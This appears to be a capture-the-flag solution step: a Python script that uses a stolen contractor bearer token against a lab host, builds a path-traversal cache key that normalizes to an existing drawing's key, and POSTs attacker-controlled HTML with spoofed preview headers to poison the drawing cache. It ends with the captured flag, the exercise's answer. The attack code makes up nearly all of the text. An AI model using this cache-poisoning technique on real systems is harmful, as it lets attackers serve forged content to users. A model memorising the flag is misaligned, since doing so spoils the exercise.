Requires W15.1 (get cache association). Use NFKC-normalized path traversal to poison the drawing cache.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
contractor = pathlib.Path("receipts/contractor-session").read_text().strip()
h_base = {"Authorization": "Bearer " + contractor, "X-ARWC-Tenant": "arwc"}

# W15.1: get cache association
d1 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://maintenance-review.arwc.test/api/drawing-cache/current", headers=h_base),
    context=ctx).read())
rec = d1["record"]
cache_path = rec["cache_key_path"]   # /viewer/drawings/DRW-OG2-R8
drawing = rec["drawing"]              # DRW-OG2-R8
drev = rec["drawing_revision"]        # R8

# Build traversal path: parent/../parent/leaf = same normalized key
parent, _, leaf = cache_path.rpartition("/")
directory = parent.rsplit("/", 1)[-1]
traversal = f"{parent}/../{directory}/{leaf}"  # /viewer/drawings/../drawings/DRW-OG2-R8

body = json.dumps({
    "path": traversal,
    "controlled_response": {
        "drawing_id": drawing, "revision": drev,
        "content_type": "text/html",
        "body": f"<section data-drawing='{drawing}' data-revision='{drev}'>Cinder preview</section>",
    }
}).encode()
h = {**h_base, "Content-Type": "application/json",
     "X-Preview-Origin": "https://preview-cinder.arwc.test",
     "X-Drawing-Revision": "R7"}
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://maintenance-review.arwc.test/api/drawing-cache/current",
                            data=body, headers=h, method="POST"),
    context=ctx).read())
print("cache_key:", d["record"]["cache_key"])   # GET:/viewer/drawings/DRW-OG2-R8
print("flag:", d["flag"])                        # FLAG{f2d9936e057d1f57}
```

Flag: `FLAG{f2d9936e057d1f57}` in the top-level `flag` field.
